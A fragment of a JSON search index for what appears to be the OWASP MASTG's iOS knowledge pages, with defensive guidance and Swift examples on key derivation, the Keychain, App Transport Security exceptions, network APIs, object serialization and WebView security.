</ul>","tags":["ios","MASVS-CRYPTO","know"]},{"location":"MASTG/knowledge/ios/MASVS-CRYPTO/MASTG-KNOW-0069/","title":"MASTG-KNOW-0069: Key Management","text":"<p>There are various methods on how to store the key on the device. Not storing a key at all will ensure that no key material can be dumped. This can be achieved by using a Password Key Derivation function, such as PKBDF-2. See the example below:</p> <pre><code>func pbkdf2SHA1(password: String, salt: Data, keyByteCount: Int, rounds: Int) -&gt; Data? {\n    return pbkdf2(hash: CCPBKDFAlgorithm(kCCPRFHmacAlgSHA1), password: password, salt: salt, keyByteCount: keyByteCount, rounds: rounds)\n}\n\nfunc pbkdf2SHA256(password: String, salt: Data, keyByteCount: Int, rounds: Int) -&gt; Data? {\n    return pbkdf2(hash: CCPBKDFAlgorithm(kCCPRFHmacAlgSHA256), password: password, salt: salt, keyByteCount: keyByteCount, rounds: rounds)\n}\n\nfunc pbkdf2SHA512(password: String, salt: Data, keyByteCount: Int, rounds: Int) -&gt; Data? {\n    return pbkdf2(hash: CCPBKDFAlgorithm(kCCPRFHmacAlgSHA512), password: password, salt: salt, keyByteCount: keyByteCount, rounds: rounds)\n}\n\nfunc pbkdf2(hash: CCPBKDFAlgorithm, password: String, salt: Data, keyByteCount: Int, rounds: Int) -&gt; Data? {\n    let passwordData = password.data(using: String.Encoding.utf8)!\n    var derivedKeyData = Data(repeating: 0, count: keyByteCount)\n    let derivedKeyDataLength = derivedKeyData.count\n    let derivationStatus = derivedKeyData.withUnsafeMutableBytes { derivedKeyBytes in\n        salt.withUnsafeBytes { saltBytes in\n\n            CCKeyDerivationPBKDF(\n                CCPBKDFAlgorithm(kCCPBKDF2),\n                password, passwordData.count,\n                saltBytes, salt.count,\n                hash,\n                UInt32(rounds),\n                derivedKeyBytes, derivedKeyDataLength\n            )\n        }\n    }\n    if derivationStatus != 0 {\n        // Error\n        return nil\n    }\n\n    return derivedKeyData\n}\n\nfunc testKeyDerivation() {\n    let password = \"password\"\n    let salt = Data([0x73, 0x61, 0x6C, 0x74, 0x44, 0x61, 0x74, 0x61])\n    let keyByteCount = 16\n    let rounds = 100_000\n\n    let derivedKey = pbkdf2SHA1(password: password, salt: salt, keyByteCount: keyByteCount, rounds: rounds)\n}\n</code></pre> <ul> <li>Source: https://stackoverflow.com/questions/8569555/pbkdf2-using-commoncrypto-on-ios, tested in the test suite of the <code>Arcane</code> library</li> </ul> <p>When you need to store the key, it is recommended to use the Keychain as long as the protection class chosen is not <code>kSecAttrAccessibleAlways</code>. Storing keys in any other location, such as the <code>NSUserDefaults</code>, property list files or by any other sink from Core Data or Realm, is usually less secure than using the KeyChain. Even when the sync of Core Data or Realm is protected by using <code>NSFileProtectionComplete</code> data protection class, we still recommend using the KeyChain. See the chapter \"Data Storage on iOS\" for more details.</p> <p>The KeyChain supports two type of storage mechanisms: a key is either secured by an encryption key stored in the secure enclave or the key itself is within the secure enclave. The latter only holds when you use an ECDH signing key. See the Apple Documentation for more details on its implementation.</p> <p>The last three options consist of using hardcoded encryption keys in the source code, having a predictable key derivation function based on stable attributes, and storing generated keys in places that are shared with other applications. Using hardcoded encryption keys is obviously not the way to go, as this would mean that every instance of the application uses the same encryption key. An attacker needs only to do the work once in order to extract the key from the source code (whether stored natively or in Objective-C/Swift). Consequently, the attacker can decrypt any other data that was encrypted by the application. Next, when you have a predictable key derivation function based on identifiers which are accessible to other applications, the attacker only needs to find the KDF and apply it to the device in order to find the key. Lastly, storing symmetric encryption keys publicly also is highly discouraged.</p> <p>Two more notions you should never forget when it comes to cryptography:</p> <ol> <li>Always encrypt/verify with the public key and always decrypt/sign with the private key.</li> <li>Never reuse the key(pair) for another purpose: this might allow leaking information about the key: have a separate key pair for signing and a separate key(pair) for encryption.</li> </ol>","tags":["ios","MASVS-CRYPTO","know"]},{"location":"MASTG/knowledge/ios/MASVS-CRYPTO/MASTG-KNOW-0070/","title":"MASTG-KNOW-0070: Random Number Generator","text":"<p>Apple provides a Randomization Services API, which generates cryptographically secure random numbers.</p> <p>The Randomization Services API uses the <code>SecRandomCopyBytes</code> function to generate numbers. This is a wrapper function for the <code>/dev/random</code> device file, which provides cryptographically secure pseudorandom values from 0 to 255. Make sure that all random numbers are generated with this API. There is no reason for developers to use a different one.</p>","tags":["ios","MASVS-CRYPTO","know"]},{"location":"MASTG/knowledge/ios/MASVS-NETWORK/MASTG-KNOW-0071/","title":"MASTG-KNOW-0071: iOS App Transport Security","text":"<p>Starting with iOS 9, Apple introduced App Transport Security (ATS) which is a set of security checks enforced by the operating system for connections made using the URL Loading System (typically via <code>URLSession</code>) to always use HTTPS. Apps should follow Apple's best practices to properly secure their connections.</p> <p>Watch ATS Introductory Video from the Apple WWDC 2015.</p> <p>ATS performs default server trust evaluation and requires a minimum set of security requirements.</p> <p>Default Server Trust Evaluation:</p> <p>When an app connects to a remote server, the server provides its identity using an X.509 digital certificate. The ATS default server trust evaluation includes validating that the certificate:</p> <ul> <li>Isn't expired.</li> <li>Has a name that matches the server's DNS name.</li> <li>Has a digital signature that is valid (hasn't been tampered with) and can be traced back to a trusted Certificate Authority (CA) included in the operating system Trust Store, or be installed on the client by the user or a system administrator.</li> </ul> <p>Minimum Security Requirements for Connections:</p> <p>ATS will block connections that further fail to meet a set of minimum security requirements including:</p> <ul> <li>TLS version 1.2 or greater.</li> <li>Data encryption with AES-128 or AES-256.</li> <li>The certificate must be signed with an RSA key (2048 bits or greater), or an ECC key (256 bits or greater).</li> <li>The certificate's fingerprint must use SHA-256 or greater.</li> <li>The link must support perfect forward secrecy (PFS) through Elliptic Curve Diffie-Hellman Ephemeral (ECDHE) key exchange.</li> </ul> <p>Certificate validity checking:</p> <p>According to Apple, \"evaluating the trusted status of a TLS certificate is performed in accordance with established industry standards, as set out in RFC 5280, and incorporates emerging standards such as RFC 6962 (Certificate Transparency). In iOS 11 or later, Apple devices are periodically updated with a current list of revoked and constrained certificates. The list is aggregated from certificate revocation lists (CRLs), which are published by each of the built-in root certificate authorities trusted by Apple, as well as by their subordinate CA issuers. The list may also include other constraints at Apple's discretion. This information is consulted whenever a network API function is used to make a secure connection. If there are too many revoked certificates from a CA to list individually, a trust evaluation may instead require that an online certificate status response (OCSP) is needed, and if the response isn't available, the trust evaluation will fail.\"</p>","tags":["ios","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/ios/MASVS-NETWORK/MASTG-KNOW-0071/#when-does-ats-not-apply","title":"When does ATS not apply?","text":"<ul> <li> <p>When using lower-level APIs: ATS only applies to the URL Loading System including URLSession and APIs layered on top of them. It does not apply to apps that use lower-level APIs (like BSD Sockets), including those that implement TLS on top of those lower-level APIs (see section \"Using ATS in Apple Frameworks\" from the Archived Apple Developer Documentation).</p> </li> <li> <p>When connecting to IP addresses, unqualified domain names or local hosts: ATS applies only to connections made to public host names (see section \"Availability of ATS for Remote and Local Connections\" from the Archived Apple Developer Documentation). The system does not provide ATS protection to connections made to:</p> <ul> <li>Internet protocol (IP) addresses</li> <li>Unqualified host names</li> <li>Local hosts employing the .local top-level domain (TLD)</li> </ul> </li> <li> <p>When including ATS Exceptions: If the app uses the ATS compatible APIs, it can still disable ATS for specific scenarios using ATS Exceptions.</p> </li> </ul> <p>Learn more:</p> <ul> <li>\"ATS and iOS enterprise apps with private networks\"</li> <li>\"ATS and local IP addresses\"</li> <li>\"ATS impact on apps use 3rd party libraries\"</li> <li>\"ATS and SSL pinning / own CA\"</li> </ul>","tags":["ios","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/ios/MASVS-NETWORK/MASTG-KNOW-0071/#ats-exceptions","title":"ATS Exceptions","text":"<p>ATS restrictions can be disabled by configuring exceptions in the <code>Info.plist</code> file under the <code>NSAppTransportSecurity</code> key. These exceptions can be applied to:</p> <ul> <li>allow insecure connections (HTTP),</li> <li>lower the minimum TLS version,</li> <li>disable Perfect Forward Secrecy (PFS) or</li> <li>allow connections to local domains.</li> </ul> <p>ATS exceptions can be applied globally or per domain basis. The application can globally disable ATS, but opt in for individual domains. The following listing from Apple Developer documentation shows the structure of the <code>NSAppTransportSecurity</code> dictionary.</p> <pre><code>NSAppTransportSecurity : Dictionary {\n    NSAllowsArbitraryLoads : Boolean\n    NSAllowsArbitraryLoadsForMedia : Boolean\n    NSAllowsArbitraryLoadsInWebContent : Boolean\n    NSAllowsLocalNetworking : Boolean\n    NSExceptionDomains : Dictionary {\n        &lt;domain-name-string&gt; : Dictionary {\n            NSIncludesSubdomains : Boolean\n            NSExceptionAllowsInsecureHTTPLoads : Boolean\n            NSExceptionMinimumTLSVersion : String\n            NSExceptionRequiresForwardSecrecy : Boolean   // Default value is YES\n            NSRequiresCertificateTransparency : Boolean\n        }\n    }\n}\n</code></pre> <p>Source: Apple Developer Documentation.</p> <p>The following table summarizes the global ATS exceptions. For more information about these exceptions, please refer to table 2 in the official Apple developer documentation.</p> Key Description <code>NSAllowsArbitraryLoads</code> Disable ATS restrictions globally excepts for individual domains specified under <code>NSExceptionDomains</code> <code>NSAllowsArbitraryLoadsInWebContent</code> Disable ATS restrictions for all the connections made from web views <code>NSAllowsLocalNetworking</code> Allow connection to unqualified domain names and .local domains <code>NSAllowsArbitraryLoadsForMedia</code> Disable all ATS restrictions for media loaded through the AV Foundations framework <p>The following table summarizes the per-domain ATS exceptions. For more information about these exceptions, please refer to table 3 in the official Apple developer documentation.</p> Key Description <code>NSIncludesSubdomains</code> Indicates whether ATS exceptions should apply to subdomains of the named domain <code>NSExceptionAllowsInsecureHTTPLoads</code> Allows HTTP connections to the named domain, but does not affect TLS requirements <code>NSExceptionMinimumTLSVersion</code> Allows connections to servers with TLS versions less than 1.2 <code>NSExceptionRequiresForwardSecrecy</code> Disable perfect forward secrecy (PFS) <p>Justifying Exceptions:</p> <p>Starting from January 1 2017, Apple App Store review requires justification if one of the following ATS exceptions are defined.</p> <ul> <li><code>NSAllowsArbitraryLoads</code></li> <li><code>NSAllowsArbitraryLoadsForMedia</code></li> <li><code>NSAllowsArbitraryLoadsInWebContent</code></li> <li><code>NSExceptionAllowsInsecureHTTPLoads</code></li> <li><code>NSExceptionMinimumTLSVersion</code></li> </ul> <p>This must be carefully revised to determine if it's indeed part of the app intended purpose. Apple warns about exceptions reducing the security of the apps and advises to configure exceptions only when needed and prefer to server fixes when faced with an ATS failure.</p> <p>Example:</p> <p>In the following example, ATS is globally enabled (there's no global <code>NSAllowsArbitraryLoads</code> defined) but an exception is explicitly set for the <code>example.com</code> domain (and its subdomains). Considering that the domain is owned by the application developers and there's a proper justification this exception would be acceptable, since it maintains all the benefits of ATS for all other domains. However, it would be always preferable to fix the server as indicated above.</p> <pre><code>&lt;key&gt;NSAppTransportSecurity&lt;/key&gt;\n&lt;dict&gt;\n    &lt;key&gt;NSExceptionDomains&lt;/key&gt;\n    &lt;dict&gt;\n        &lt;key&gt;example.com&lt;/key&gt;\n        &lt;dict&gt;\n            &lt;key&gt;NSIncludesSubdomains&lt;/key&gt;\n            &lt;true/&gt;\n            &lt;key&gt;NSExceptionMinimumTLSVersion&lt;/key&gt;\n            &lt;string&gt;TLSv1.2&lt;/string&gt;\n            &lt;key&gt;NSExceptionAllowsInsecureHTTPLoads&lt;/key&gt;\n            &lt;true/&gt;\n            &lt;key&gt;NSExceptionRequiresForwardSecrecy&lt;/key&gt;\n            &lt;true/&gt;\n        &lt;/dict&gt;\n    &lt;/dict&gt;\n&lt;/dict&gt;\n</code></pre> <p>For more information on ATS exceptions please consult section \"Configure Exceptions Only When Needed; Prefer Server Fixes\" from the article \"Preventing Insecure Network Connections\" in the Apple Developer Documentation and the blog post on ATS.</p>","tags":["ios","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/ios/MASVS-NETWORK/MASTG-KNOW-0072/","title":"MASTG-KNOW-0072: Server Trust Evaluation","text":"<p>ATS imposes extended security checks that supplement the default server trust evaluation prescribed by the Transport Layer Security (TLS) protocol. Loosening ATS restrictions reduces the security of the app. Apps should prefer alternative ways to improve server security before adding ATS exceptions.</p> <p>The Apple Developer Documentation explains that an app can use <code>URLSession</code> to automatically handle server trust evaluation. However, apps are also able to customize that process, for example they can:</p> <ul> <li>bypass or customize certificate expiry.</li> <li>loosen/extend trust: accept server credentials that would otherwise be rejected by the system, e.g. to make secure connections to a development server using self-signed certificates embedded in the app.</li> <li>tighten trust: reject credentials that would otherwise be accepted by the system.</li> <li>etc.</li> </ul> <p></p> <p>References:</p> <ul> <li>Preventing Insecure Network Connections</li> <li>Performing Manual Server Trust Authentication</li> <li>Certificate, Key, and Trust Services</li> </ul>","tags":["ios","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/ios/MASVS-NETWORK/MASTG-KNOW-0073/","title":"MASTG-KNOW-0073: iOS Network APIs","text":"<p>Since iOS 12.0 the Network framework and the <code>URLSession</code> class provide methods to load network and URL requests asynchronously and synchronously. Older iOS versions can utilize the Sockets API.</p>","tags":["ios","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/ios/MASVS-NETWORK/MASTG-KNOW-0073/#network-framework","title":"Network Framework","text":"<p>The <code>Network</code> framework was introduced at The Apple Worldwide Developers Conference (WWDC) in 2018 and is a replacement to the Sockets API. This low-level networking framework provides classes to send and receive data with built in dynamic networking, security and performance support.</p> <p>TLS 1.3 is enabled by default in the <code>Network</code> framework, if the argument <code>using: .tls</code> is used. It is the preferred option over the legacy Secure Transport framework.</p>","tags":["ios","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/ios/MASVS-NETWORK/MASTG-KNOW-0073/#urlsession","title":"URLSession","text":"<p><code>URLSession</code> was built upon the <code>Network</code> framework and utilizes the same transport services. The class also uses TLS 1.3 by default, if the endpoint is HTTPS.</p> <p><code>URLSession</code> should be used for HTTP and HTTPS connections, instead of utilizing the <code>Network</code> framework directly. The <code>URLSession</code> class natively supports both URL schemes and is optimized for such connections. It requires less boilerplate code, reducing the possibility for errors and ensuring secure connections by default. The <code>Network</code> framework should only be used when there are low-level and/or advanced networking requirements.</p> <p>The official Apple documentation includes examples of using the <code>Network</code> framework to implement netcat and <code>URLSession</code> to fetch website data into memory.</p>","tags":["ios","MASVS-NETWORK","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0074/","title":"MASTG-KNOW-0074: Enforced Updating","text":"<p>Enforced updating can be helpful when it comes to public key pinning (see the Testing Network communication for more details) when a pin has to be refreshed due to a certificate/public key rotation. Additionally, vulnerabilities are easily patched by means of forced updates.</p> <p>The challenge with iOS however, is that Apple does not provide any APIs yet to automate this process, instead, developers will have to create their own mechanism, such as described at various blogs which boil down to looking up properties of the app using <code>http://itunes.apple.com/lookup\\?id\\&lt;BundleId&gt;</code> or third party libraries, such as Siren and react-native-appstore-version-checker. Most of these implementations will require a certain given version offered by an API or just \"latest in the appstore\", which means users can be frustrated with having to update the app, even though no business/security need for an update is truly there.</p> <p>Please note that newer versions of an application will not fix security issues that are living in the backends to which the app communicates. Allowing an app not to communicate with it might not be enough. Having proper API-lifecycle management is key here. Similarly, when a user is not forced to update, do not forget to test older versions of your app against your API and/or use proper API versioning.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0075/","title":"MASTG-KNOW-0075: Object Serialization","text":"<p>There are several ways to persist an object on iOS:</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0075/#object-encoding","title":"Object Encoding","text":"<p>iOS comes with two protocols for object encoding and decoding for Objective-C or <code>NSObject</code>s: <code>NSCoding</code> and <code>NSSecureCoding</code>. When a class conforms to either of the protocols, the data is serialized to <code>NSData</code>: a wrapper for byte buffers. Note that <code>Data</code> in Swift is the same as <code>NSData</code> or its mutable counterpart: <code>NSMutableData</code>. The <code>NSCoding</code> protocol declares the two methods that must be implemented in order to encode/decode its instance-variables. A class using <code>NSCoding</code> needs to implement <code>NSObject</code> or be annotated as an @objc class. The <code>NSCoding</code> protocol requires to implement encode and init as shown below.</p> <pre><code>class CustomPoint: NSObject, NSCoding {\n\n    //required by NSCoding:\n    func encode(with aCoder: NSCoder) {\n        aCoder.encode(x, forKey: \"x\")\n        aCoder.encode(name, forKey: \"name\")\n    }\n\n    var x: Double = 0.0\n    var name: String = \"\"\n\n    init(x: Double, name: String) {\n            self.x = x\n            self.name = name\n    }\n\n    // required by NSCoding: initialize members using a decoder.\n    required convenience init?(coder aDecoder: NSCoder) {\n            guard let name = aDecoder.decodeObject(forKey: \"name\") as? String\n                    else {return nil}\n            self.init(x:aDecoder.decodeDouble(forKey:\"x\"),\n                                name:name)\n    }\n\n    //getters/setters/etc.\n}\n</code></pre> <p>The issue with <code>NSCoding</code> is that the object is often already constructed and inserted before you can evaluate the class-type. This allows an attacker to easily inject all sorts of data. Therefore, the <code>NSSecureCoding</code> protocol has been introduced. When conforming to <code>NSSecureCoding</code> you need to include:</p> <pre><code>static var supportsSecureCoding: Bool {\n        return true\n}\n</code></pre> <p>when <code>init(coder:)</code> is part of the class. Next, when decoding the object, a check should be made, e.g.:</p> <pre><code>let obj = decoder.decodeObject(of:MyClass.self, forKey: \"myKey\")\n</code></pre> <p>The conformance to <code>NSSecureCoding</code> ensures that objects being instantiated are indeed the ones that were expected. However, there are no additional integrity checks done over the data and the data is not encrypted. Therefore, any secret data needs additional encryption and data of which the integrity must be protected, should get an additional HMAC.</p> <p>Note, when <code>NSData</code> (Objective-C) or the keyword <code>let</code> (Swift) is used: then the data is immutable in memory and cannot be easily removed.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0075/#object-archiving-with-nskeyedarchiver","title":"Object Archiving with NSKeyedArchiver","text":"<p><code>NSKeyedArchiver</code> is a concrete subclass of <code>NSCoder</code> and provides a way to encode objects and store them in a file. The <code>NSKeyedUnarchiver</code> decodes the data and recreates the original data. Let's take the example of the <code>NSCoding</code> section and now archive and unarchive them:</p> <pre><code>// archiving:\nNSKeyedArchiver.archiveRootObject(customPoint, toFile: \"/path/to/archive\")\n\n// unarchiving:\nguard let customPoint = NSKeyedUnarchiver.unarchiveObjectWithFile(\"/path/to/archive\") as?\n    CustomPoint else { return nil }\n</code></pre> <p>When decoding a keyed archive, because values are requested by name, values can be decoded out of sequence or not at all. Keyed archives, therefore, provide better support for forward and backward compatibility. This means that an archive on disk could actually contain additional data which is not detected by the program, unless the key for that given data is provided at a later stage.</p> <p>Note that additional protection needs to be in place to secure the file in case of confidential data, as the data is not encrypted within the file. See the chapter \"Data Storage on iOS\" for more details.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0075/#codable","title":"Codable","text":"<p>With Swift 4, the <code>Codable</code> type alias arrived: it is a combination of the <code>Decodable</code> and <code>Encodable</code> protocols. A <code>String</code>, <code>Int</code>, <code>Double</code>, <code>Date</code>, <code>Data</code> and <code>URL</code> are <code>Codable</code> by nature: meaning they can easily be encoded and decoded without any additional work. Let's take the following example:</p> <pre><code>struct CustomPointStruct:Codable {\n    var x: Double\n    var name: String\n}\n</code></pre> <p>By adding <code>Codable</code> to the inheritance list for the <code>CustomPointStruct</code> in the example, the methods <code>init(from:)</code> and <code>encode(to:)</code> are automatically supported. Fore more details about the workings of <code>Codable</code> check the Apple Developer Documentation. The <code>Codable</code>s can easily be encoded / decoded into various representations: <code>NSData</code> using <code>NSCoding</code>/<code>NSSecureCoding</code>, JSON, Property Lists, XML, etc. See the subsections below for more details.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0075/#json-and-codable","title":"JSON and Codable","text":"<p>There are various ways to encode and decode JSON within iOS by using different third-party libraries:</p> <ul> <li>Mantle</li> <li>JSONModel library</li> <li>SwiftyJSON library</li> <li>ObjectMapper library</li> <li>JSONKit</li> <li>JSONModel</li> <li>YYModel</li> <li>SBJson 5</li> <li>Unbox</li> <li>Gloss</li> <li>Mapper</li> <li>JASON</li> <li>Arrow</li> </ul> <p>The libraries differ in their support for certain versions of Swift and Objective-C, whether they return (im)mutable results, speed, memory consumption and actual library size. Again, note in case of immutability: confidential information cannot be removed from memory easily.</p> <p>Next, Apple provides support for JSON encoding/decoding directly by combining <code>Codable</code> together with a <code>JSONEncoder</code> and a <code>JSONDecoder</code>:</p> <pre><code>struct CustomPointStruct: Codable {\n    var point: Double\n    var name: String\n}\n\nlet encoder = JSONEncoder()\nencoder.outputFormatting = .prettyPrinted\n\nlet test = CustomPointStruct(point: 10, name: \"test\")\nlet data = try encoder.encode(test)\nlet stringData = String(data: data, encoding: .utf8)\n\n// stringData = Optional ({\n// \"point\" : 10,\n// \"name\" : \"test\"\n// })\n</code></pre> <p>JSON itself can be stored anywhere, e.g., a (NoSQL) database or a file. You just need to make sure that any JSON that contains secrets has been appropriately protected (e.g., encrypted/HMACed). See the chapter \"Data Storage on iOS\" for more details.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0075/#property-lists-and-codable","title":"Property Lists and Codable","text":"<p>You can persist objects to property lists (also called plists in previous sections). You can find two examples below of how to use it:</p> <pre><code>// archiving:\nlet data = NSKeyedArchiver.archivedDataWithRootObject(customPoint)\nNSUserDefaults.standardUserDefaults().setObject(data, forKey: \"customPoint\")\n\n// unarchiving:\n\nif let data = NSUserDefaults.standardUserDefaults().objectForKey(\"customPoint\") as? NSData {\n    let customPoint = NSKeyedUnarchiver.unarchiveObjectWithData(data)\n}\n</code></pre> <p>In this first example, the <code>NSUserDefaults</code> are used, which is the primary property list. We can do the same with the <code>Codable</code> version:</p> <pre><code>struct CustomPointStruct: Codable {\n        var point: Double\n        var name: String\n    }\n\n    var points: [CustomPointStruct] = [\n        CustomPointStruct(point: 1, name: \"test\"),\n        CustomPointStruct(point: 2, name: \"test\"),\n        CustomPointStruct(point: 3, name: \"test\"),\n    ]\n\n    UserDefaults.standard.set(try? PropertyListEncoder().encode(points), forKey: \"points\")\n    if let data = UserDefaults.standard.value(forKey: \"points\") as? Data {\n        let points2 = try? PropertyListDecoder().decode([CustomPointStruct].self, from: data)\n    }\n</code></pre> <p>Note that <code>plist</code> files are not meant to store secret information. They are designed to hold user preferences for an app.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0075/#xml","title":"XML","text":"<p>There are multiple ways to do XML encoding. Similar to JSON parsing, there are various third party libraries, such as:</p> <ul> <li>Fuzi</li> <li>Ono</li> <li>AEXML</li> <li>RaptureXML</li> <li>SwiftyXMLParser</li> <li>SWXMLHash</li> </ul> <p>They vary in terms of speed, memory usage, object persistence and more important: differ in how they handle XML external entities. See XXE in the Apple iOS Office viewer as an example. Therefore, it is key to disable external entity parsing if possible. See the OWASP XXE prevention cheatsheet for more details. Next to the libraries, you can make use of Apple's <code>XMLParser</code> class</p> <p>When not using third party libraries, but Apple's <code>XMLParser</code>, be sure to let <code>shouldResolveExternalEntities</code> return <code>false</code>.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0075/#object-relational-mapping-coredata-and-realm","title":"Object-Relational Mapping (CoreData and Realm)","text":"<p>There are various ORM-like solutions for iOS. The first one is Realm, which comes with its own storage engine. Realm has settings to encrypt the data as explained in Realm's documentation. This allows for handling secure data. Note that the encryption is turned off by default.</p> <p>Apple itself supplies <code>CoreData</code>, which is well explained in the Apple Developer Documentation. It supports various storage backends as described in Apple's Persistent Store Types and Behaviors documentation. The issue with the storage backends recommended by Apple, is that none of the type of data stores is encrypted, nor checked for integrity. Therefore, additional actions are necessary in case of confidential data. An alternative can be found in project iMas, which does supply out of the box encryption.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0075/#protocol-buffers","title":"Protocol Buffers","text":"<p>Protocol Buffers by Google, are a platform- and language-neutral mechanism for serializing structured data by means of the Binary Data Format. They are available for iOS by means of the Protobuf library. There have been a few vulnerabilities with Protocol Buffers, such as CVE-2015-5237. Note that Protocol Buffers do not provide any protection for confidentiality as no built-in encryption is available.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/","title":"MASTG-KNOW-0076: WebViews","text":"<p>WebViews are in-app browser components for displaying interactive web content. They can be used to embed web content directly into an app's user interface. iOS WebViews support JavaScript execution by default, so script injection and Cross-Site Scripting attacks can affect them.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/#types-of-webviews","title":"Types of WebViews","text":"<p>There are multiple ways to include a WebView in an iOS application:</p> <ul> <li><code>UIWebView</code></li> <li><code>WKWebView</code></li> <li><code>SFSafariViewController</code></li> </ul>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/#uiwebview","title":"UIWebView","text":"<p><code>UIWebView</code> is deprecated starting on iOS 12 and should not be used. Make sure that either <code>WKWebView</code> or <code>SFSafariViewController</code> are used to embed web content. In addition to that, JavaScript cannot be disabled for <code>UIWebView</code> which is another reason to refrain from using it.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/#wkwebview","title":"WKWebView","text":"<p><code>WKWebView</code> was introduced with iOS 8 and is the appropriate choice for extending app functionality, controlling displayed content (i.e., prevent the user from navigating to arbitrary URLs) and customizing.</p> <p><code>WKWebView</code> comes with several security advantages over <code>UIWebView</code>:</p> <ul> <li>JavaScript is enabled by default but thanks to the <code>javaScriptEnabled</code> property of <code>WKWebView</code>, it can be completely disabled, preventing all script injection flaws.</li> <li>The <code>JavaScriptCanOpenWindowsAutomatically</code> can be used to prevent JavaScript from opening new windows, such as pop-ups.</li> <li>The <code>hasOnlySecureContent</code> property can be used to verify resources loaded by the WebView are retrieved through encrypted connections.</li> <li><code>WKWebView</code> implements out-of-process rendering, so memory corruption bugs won't affect the main app process.</li> </ul> <p>A JavaScript Bridge can be enabled when using <code>WKWebView</code> and <code>UIWebView</code>. See Section \"Native Functionality Exposed Through WebViews\" below for more information.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/#sfsafariviewcontroller","title":"SFSafariViewController","text":"<p><code>SFSafariViewController</code> is available starting on iOS 9 and should be used to provide a generalized web viewing experience. These WebViews can be easily spotted as they have a characteristic layout which includes the following elements:</p> <ul> <li>A read-only address field with a security indicator.</li> <li>An Action (\"Share\") button.</li> <li>A Done button, back and forward navigation buttons, and a \"Safari\" button to open the page directly in Safari.</li> </ul> <p></p> <p>There are a couple of things to consider:</p> <ul> <li>JavaScript cannot be disabled in <code>SFSafariViewController</code> and this is one of the reasons why the usage of <code>WKWebView</code> is recommended when the goal is extending the app's user interface.</li> <li><code>SFSafariViewController</code> also shares cookies and other website data with Safari.</li> <li>The user's activity and interaction with a <code>SFSafariViewController</code> are not visible to the app, which cannot access AutoFill data, browsing history, or website data.</li> <li>According to the App Store Review Guidelines, <code>SFSafariViewController</code>s may not be hidden or obscured by other views or layers.</li> </ul> <p>This should be sufficient for an app analysis and therefore, <code>SFSafariViewController</code>s are out of scope for the Static and Dynamic Analysis sections.</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/#safari-web-inspector","title":"Safari Web Inspector","text":"<p>Enabling the Safari Web Inspector on iOS allows you to remotely inspect the contents of a WebView from a macOS device. This is particularly useful in applications that expose native APIs using a JavaScript bridge, such as hybrid applications.</p> <p>The Safari Web Inspector requires apps to have the <code>get-task-allowed</code> entitlement. The Safari app has this entitlement by default, so you can view the contents of any page loaded into it. However, applications installed from the App Store will not have this entitlement and cannot be attached. On jailbroken devices, you can add this entitlement to any application by installing  GlobalWebInspect. Then, you can attach Safari on your host to examine the contents of the WebView (see  Attach to WKWebView).</p>","tags":["ios","MASVS-PLATFORM","know"]},{"location":"MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/#native-functionality-exposed-through-webviews","title":"Native Functionality Exposed Through WebViews","text":"<p>In iOS 7, Apple introduced APIs that allow communication between the JavaScript runtime in the WebView and the native Swift or Objective-C objects. If these APIs are used carelessly, important functionality might be exposed to attackers who manage to inject malicious scripts into the WebView (e.g., through a successful Cross-Site Scripting attack).</p> <p>Both <code>UIWebView</code> and <code>WKWebView</code> provide a means of communication between the WebView and the native app. Any important data or native functionality exposed to the WebView JavaScript engine would also be accessible to rogue JavaScript running in the WebView.</p> <p>UIWebView:</p> <p>There are two fundamental ways of how native code and JavaScript can communicate:</p> <ul> <li>JSContext: When an Objective-C or Swift block is assigned to an identifier in a <code>JSContext</code>, JavaScriptCore automatically wraps the block in a JavaScript function.</li> <li>JSExport protocol: Properties, instance methods and class methods declared in a <code>JSExport</code>-inherited protocol are mapped to JavaScript objects that are available to all JavaScript code. Modifications of objects that are in the JavaScript environment are reflected in the native environment.</li> </ul> <p>Note that only class members defined in the <code>JSExport</code> protocol are made accessible to JavaScript code.</p> <p>WKWebView:</p> <p>JavaScript code in a <code>WKWebView</code> can still send messages back to the native app but in contrast to <code>UIWebView</code>, it is not possible to directly reference the <code>JSContext</code> of a <code>WKWebView</code>. Instead, communication is implemented using a messaging system and using the <code>postMessage</code> function, which automatically serializes 